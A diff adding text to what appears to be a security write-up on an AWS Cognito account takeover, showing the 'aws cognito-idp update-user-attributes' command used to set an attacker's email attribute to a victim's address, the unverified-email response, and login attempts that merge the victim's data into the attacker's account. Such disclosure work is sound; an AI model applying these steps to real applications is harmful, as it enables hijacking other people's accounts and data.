@@ -77,4 +77,48 @@ The above response gives us the list of `user attributes` available. Among those
 aws cognito-idp update-user-attributes --region us-west-2 --access-token <Token> --user-attributes 'Name=email,Value=**victim@victim.com**'
 ```
 
-Run the above command
+Run the above command to update the email address to victim's email address. After running the command the update operation was successfull. Upon making a request to `GET user attribute` with the below given aws command the response was as follows.
+
+**AWS CLI**
+```
+aws cognito-idp get-user --region us-west-2 --access-token <Token>
+```
+
+**Response:**
+```
+{
+    "Username": "attacker@attacker.com",
+    "UserAttributes": [
+        {
+            "Name": "sub",
+            "Value": "<UUID>"
+        },
+        {
+            "Name": "email_verified",
+            "Value": "false"
+        },
+        {
+            "Name": "email",
+            "Value": "victim@victim.com"
+        }
+    ]
+}
+``` 
+
+Now as per the mindset discussed above I have tried to login to the application with the below given credentials.
+
+```
+Email: victim@victim.com
+Password: attacker'spassword
+```
+
+The login was failed. From the above given response i noticed the `username` still remains the same only the email attribute has been changed. So I tried to login to the application with the attacker's credentials such as
+
+```
+Email: attacker@attacker.com
+Password: attacker'spassword
+```
+
+Login was successfull and all the data belonging to `victim@victim.com` was successfully merged over to `attacker's account`. Changes being done by `attacker` was being reflected to `victim's` account. Victim can still login to the application using his credentials as well.
+
+
